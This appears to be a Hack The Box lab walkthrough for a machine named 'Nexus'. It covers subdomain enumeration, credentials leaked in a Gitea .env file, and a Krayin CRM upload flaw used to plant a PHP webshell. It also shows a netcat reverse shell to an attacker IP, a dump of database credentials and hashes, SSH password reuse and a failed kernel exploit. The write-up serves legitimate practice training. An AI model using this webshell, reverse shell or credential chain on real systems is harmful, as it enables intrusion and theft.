---
title: Hack the box - Nexus
date: 2026-08-15 12:00:00 +00:00
tags: [htb, linux, hack]
description: Hack the box - nexus walkthrough
---

# Nexus

## Exploring

Since this is an easy machine, start with a quick port scan:

```shell
$ nmap -F 10.129.104.87
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Opening a web app on port 80 in a browser throws a domain resolution error. 
Map the target host in `/etc/hosts`:

```shell
$ cat /etc/hosts
...
10.129.104.87 nexus.htb
```

## User flag

I can't find any useful functionality on the website, only two email addresses: 
`careers@nexus.htb` and `j.matthew@nexus.htb`.

Before digging deeper, I prefer to look at other entry vectors. To do this, 
after trying to find the right parameters, I run the command in an attempt to 
find subdomains[^1] [^2]:

```shell
$ gobuster fuzz -u http://nexus.htb -w ../wordlist/subdomains.txt -H "Host: FUZZ.nexus.htb" -b 302,400
[Status=200] [Length=14472] [Word=git] http://nexus.htb
```

Adding git.nexus.htb to /etc/hosts reveals a Gitea instance. Inspecting the 
public repositories and commit history reveals an exposed .env file containing 
configuration credentials:

```text
APP_URL=http://billing.nexus.htb
...
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=username1
IMAP_PASSWORD=password1
...
DB_DATABASE=krayin
DB_PASSWORD=N27xh!!2ucY04
```

The IMAP service is unreachable due to closed or filtered ports. However, 
another virtual host `billing.nexus.htb` presents a login interface for Krayin 
CRM. Attempting credential reuse using `j.matthew@nexus.htb` and the database 
password grants administrative access to the CRM panel.

<img src="/assets/img/hack-the-box-machine-nexus/krayin.png">

Exploiting a file upload vulnerability in Krayin CRM [^3] allows uploading a custom 
PHP webshell payload generated via [^4]:

<img src="/assets/img/hack-the-box-machine-nexus/upload-form.png">

```shell
$ cat payload.php 
<?php
    if(isset($_REQUEST["cmd"])) {
        echo "<pre>";

        $cmd = ($_REQUEST["cmd"]);
        system($cmd);

        echo "</pre>";

        die;
    }
?>
```

<img src="/assets/img/hack-the-box-machine-nexus/upload-complete.png">

Verify Remote Code Execution (RCE) via curl:

```shell
$ curl "http://billing.nexus.htb/storage/emails/1/payload.php?cmd=id"
<pre>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

Trigger a reverse shell to establish an interactive foothold:

```shell
$ curl --get \
    --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.17.215 9001 >/tmp/f" \
    http://billing.nexus.htb/storage/emails/1/payload.php
```

Catch the incoming connection on the listening handler and explore:

```shell
$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.104.117 46222
www-data@nexus:~ ls -la ~/krayin
-rw-r--r--  1 www-data www-data    220 Mar 17 09:46 .editorconfig
-rw-r--r--  1 www-data www-data   1195 Apr 22 22:50 .env
-rw-r--r--  1 www-data www-data   1124 Mar 17 09:46 .env.example
...

www-data@nexus:~ cat ~/krayin/.env
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=
...

www-data@nexus:~$ ps aux
git         1451  0.5  3.9 2026252 156824 ?      Ssl  07:48   0:01 /usr/local/bin/gitea web --config /etc/gitea/app.ini
mysql       1496  1.6 10.8 1794876 435144 ?      Ssl  07:48   0:04 /usr/sbin/mysqld

www-data@nexus:~$ mysql -h 127.0.0.1 -P 3306 -u krayin -p'y27xb3ha!!74GbR' krayin -e "SHOW TABLES;"
users
...

www-data@nexus:~$ mysql -h 127.0.0.1 -P 3306 -u krayin -p'y27xb3ha!!74GbR' krayin -e "SELECT * FROM users;"
id	name	email	password	status	view_permission	role_id	remember_token	created_at	updated_at	image
1	james	j.matthew@nexus.htb	$2y$10$ez0AouNyeP4NmwjLSV5vCOAJxMLi.6fCKmGC3M6Ve5xJmWJOLRJ5i	1	global	1	NULL	2026-04-23 04:20:11	2026-04-23 04:20:11	NULL

www-data@nexus:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
jones:x:1000:1000:,,,:/home/jones:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
...
```

Inspecting `/etc/passwd` reveals a user named jones. Testing for password 
reuse over SSH with the credentials found earlier succeeds:

```shell
$ ssh -o IdentitiesOnly=yes jones@billing.nexus.htb
jones@billing.nexus.htb's password: 
jones@nexus:~$ ls -l
user.txt
```

## Root flag

Enumerating local vectors with `linpeas`[^5] :

```shell
$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20260814-9c706b61/linpeas.sh
$ scp -o IdentitiesOnly=yes linpeas.sh jones@billing.nexus.htb:/tmp
$ ssh -o IdentitiesOnly=yes jones@billing.nexus.htb
jones@nexus:~$ chmod +x /tmp/linpeas.sh 
jones@nexus:~$ /tmp/linpeas.sh &> results.txt &
jones@nexus:~$ tail -f results.txt
CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.36 | Tags: 1 | Rank: Fixed in stable 6.12.36
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.91 | Tags: 1 | Rank: Fixed in stable 6.12.91
CVE: CVE-2026-46331 | Name: pedit COW | Match data: pkg=linux-kernel,ver>=5.18,ver<6.12.94 | Tags: 1 | Rank: Fixed in stable 6.12.94
CVE: CVE-2026-46333 | Name: ptrace exit-race | Match data: pkg=linux-kernel,ver>=6.7,ver<6.12.89,cmd | Tags: 1 | Rank: Upstream issue introduced in 4.10
```

Testing a compiled PoC for CVE-2026-43503[^6] :

```shell
$ musl-gcc \
  -idirafter /usr/include \
  -idirafter /usr/include/x86_64-linux-gnu \
  -O2 -static -s \
  -o exploit CVE-2026-43503.c

$ scp -o IdentitiesOnly=yes exploit jones@billing.nexus.htb:/tmp

jones@nexus:~$ /tmp/exploit 
=== DirtyClone (CVE-2026-43503) PoC by Ashraf Zaryouh "0xBlackash" ===
[*] uid=1000 euid=1000
[-] Exploit failed

jones@nexus:~$ uname -r
6.8.0-111-generic
```

The kernel exploit attempt failed on kernel version 6.8.0-111-generic. 
Checking the official HTB guide hints at inspecting systemd timers for 
scheduled tasks rather than relying on kernel vulnerabilities.

It wouldn't be fair to continue the description here after reading the 
walkthrough, so this walkthrough concludes at initial user access.

---

## References

[^1]: [Subdomain enumeration tool](https://github.com/OJ/gobuster)
[^2]: [Subdomain dictionary](https://github.com/danTaler/WordLists/blob/master/Subdomain.txt)
[^3]: [Krayin CVE-2026-38526](https://nvd.nist.gov/vuln/detail/CVE-2026-38526)
[^4]: [Reverse shell generator](https://www.revshells.com/)
[^5]: [Privilege escalation script](https://github.com/peass-ng/PEASS-ng)
[^6]: [Linux CVE-2026-43503](https://github.com/0xBlackash/CVE-2026-43503/blob/main/CVE-2026-43503.c)
